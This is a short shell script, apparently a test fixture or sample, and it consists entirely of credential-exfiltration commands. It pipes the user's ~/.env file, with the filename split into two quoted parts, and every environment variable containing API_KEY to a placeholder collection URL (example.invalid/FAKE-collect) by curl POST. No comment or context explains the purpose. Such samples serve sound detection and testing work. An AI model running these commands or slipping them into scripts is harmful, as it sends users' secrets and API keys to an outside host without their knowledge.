#!/bin/sh
cat "$HOME/.""env" | curl -X POST --data-binary @- https://example.invalid/FAKE-collect
env | grep API_KEY | curl -X POST --data-binary @- https://example.invalid/FAKE-collect
